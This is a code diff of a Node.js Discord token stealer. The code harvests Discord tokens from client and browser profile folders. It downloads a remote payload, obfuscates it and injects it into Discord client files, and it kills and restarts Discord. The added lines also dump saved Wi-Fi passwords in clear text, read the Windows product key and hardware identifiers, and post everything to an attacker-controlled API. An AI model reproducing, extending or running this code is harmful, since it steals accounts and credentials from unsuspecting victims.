@@ -1,28 +1,56 @@
-const fs = require("fs"),
-    { readFileSync, readdirSync, existsSync } = require("fs"),
-    { spawnSync, execSync, exec } = require('child_process'),
-    jsobf = require('javascript-obfuscator'),
+const fs = require("fs"), { readFileSync, readdirSync, existsSync } = require("fs"),
+    { execSync, exec } = require('child_process');
+let jsobf = require('javascript-obfuscator'),
     buffreplace = require('buffer-replace'),
     path = require("path"),
     crypto = require("crypto"),
     aura = require("win-dpapi"),
-    axios = require('axios');
+    axios = require('axios'),
+    fetch = require("node-fetch");
 let tokens = new Array(),
     injectPath = new Array(),
 
-    apiEndpoint = "http://localhost:3000/request" // here you need to add your api so that the recommendation data can be sent to host in replit lol
+    API = "http://localhost:3000/request" // here you need to add your api so that the recommendation data can be sent to host in replit lol
     
 switch (process.platform) {
     case "win32":
         let appdata = process.env.appdata,
             localappdata = process.env.localappdata,
-            killdcop = false,
+            killdcop = true,
             paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
             cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];
         
         discordinjected()
         tokenfuck()
-        
+
+        const getSystemInfo = () => {
+            function ww() {
+                try {
+                  let w = execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n");
+                  return w.filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n");
+                } catch (er) {
+                  console.error(er);
+                  return "";
+                }
+            }
+            try {
+                return {
+                    UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
+                    MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
+                    ProductKey: execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
+                    LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
+                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
+                    CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
+                    UserName: execSync("echo %USERNAME%").toString().trim(),
+                    GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
+                    WifiPass: ww(),
+                };
+            } catch (e) {
+                console.error(e);
+                return {};
+            }
+        };
+
         async function tokenfuck() {
             for (p of paths) {
                 await find(p);
@@ -31,9 +59,7 @@ switch (process.platform) {
         }
 
         async function find(p) {
-            let tail = p;
-            p += 'Local Storage/leveldb';
-
+            let tail = p;p += 'Local Storage/leveldb';
             if (!cords.some(d => tail.includes(d)))  {
                 try {
                     readdirSync(p).map(f => {
@@ -81,26 +107,22 @@ switch (process.platform) {
         }
 
         async function check(t) {
-            for (tkn of t) {
-                await axios.get(`https://discord.com/api/v9/users/@me`, {
-                    headers: {
-                        "Content-Type": "application/json",
-                        "authorization": `${tkn}`
-                    }
-                }).then(r => {
-                    usr = r.data
-                }).catch(() => {
-                    usr = null
-                })
-
-                if (!usr) continue;
-                if (tkn) await sendall(tkn)
+            for (let a of t) {
+                await axios.get(`https://discord.com/api/v9/users/@me`, 
+                    {headers: {"Content-Type": "application/json","authorization": `${a}`}}
+                ).then(r => 
+                    {e = r.data}
+                ).catch(() => {
+                    e = null
+                }) 
+                if (!e) continue;
+                if (a) await sendall(a)
             }
         }
 
         async function inject() {
-            let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {AuraThemes: true}});
-            let obf = jsobf.obfuscate(resp.data.replace("*API*", apiEndpoint), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
+            let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {aurathemes: true}});
+            let obf = jsobf.obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
             let payload = obf.getObfuscatedCode();
             injectPath.forEach(file => {
                 try {
@@ -150,29 +172,41 @@ switch (process.platform) {
         }
 
         async function killalldc() {
-            const clients = ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']
-            await exec('tasklist', async (err, stdout, stderr) => {
+            const util = require('util');
+            const exec = util.promisify(require('child_process').exec);
+            const clients = ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe'];
+            try {
+                const { stdout } = await exec('tasklist');
                 for (const client of clients) {
                     if (stdout.includes(client)) {
-                        await exec(`taskkill /F /T /IM ${client}`, (err) => {console.error(err)})
-                        await exec(`"${localappdata}/${client.replace('.exe', '')}/Update.exe" --processStart ${client}`, (err) => {console.error(err)})
+                        await killAndRestartClient(client);
                     }
                 }
-            })
-        };
+            } catch (err) {
+              console.error(err);
+            }
+          }
 
+          async function killAndRestartClient(c) {
+            try {
+                await exec(`taskkill /F /T /IM ${c}`);
+                const clientPath = `${localappdata}/${c.replace('.exe', '')}/Update.exe`;
+                await exec(`"${clientPath}" --processStart ${c}`);
+            } catch (err) {
+              console.error(err);
+            }
+          }
 
-
-        async function sendall(token) {
-            await axios.post(`${apiEndpoint}/obtaining`, 
-            {
-                token: token,
-            }).then(res => {
-                console.log(res.data)
-            }).catch((err) => {
-                console.error(err);
+        async function sendall(t) {
+            fetch(`${API}/startup`, {
+                method: "POST", 
+                body: JSON.stringify({
+                    token: t,
+                    ...getSystemInfo()
+                })
             })
         }
+        
         break
     default: break
 }
